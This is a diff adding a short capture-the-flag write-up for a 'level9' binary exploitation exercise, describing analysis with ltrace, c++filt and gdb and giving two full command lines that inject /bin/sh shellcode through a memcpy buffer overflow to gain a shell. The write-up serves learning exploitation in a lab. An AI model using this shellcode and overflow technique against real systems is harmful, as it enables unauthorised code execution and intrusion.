@@ -1,0 +1,22 @@
+Starting the './level9', nothing happens (even with different numbers of arguments).
+
+Using ltrace with  './level9 "radomstring"' we get some function calls, more importantly, a call to memcpy which isn't a safe function.
+Additionnaly, there is multiple strange function names such as '_ZNSt8ios_base4InitC1Ev' or '_Znwj'. After some researches, we found that these are
+methods calls from an 'N' C++ class. The program 'c++filt' can translate them for us.
+
+Now, opening the program with gdb, we didn't find any calls to 'system()' so let's bring back our shellcode from previous levels.
+
+Before that, we need to find the offset to overflow and the return address of 'memcpy'(0x0804a00c). 
+Then let's put our shellcode in the memcpy and its address in the overflow: 
+
+./level9 `python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*80 + '\x0c\xa0\x04\x08'"`
+
+IT DOESN'T WORK. 
+We searched in the gdb disas, and found that the calls in the main is *%edx so it dereference the address given so lets give the address of the shellcode before it:
+0x08004a00c + 4 (address size) -> 0x0804a010 aat the start and remove 4 fillers chars
+
+We got:
+
+./level9 `python -c "print '\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + '\x0c\xa0\x04\x08'"`
+
+Finally we have a shell with bonus0
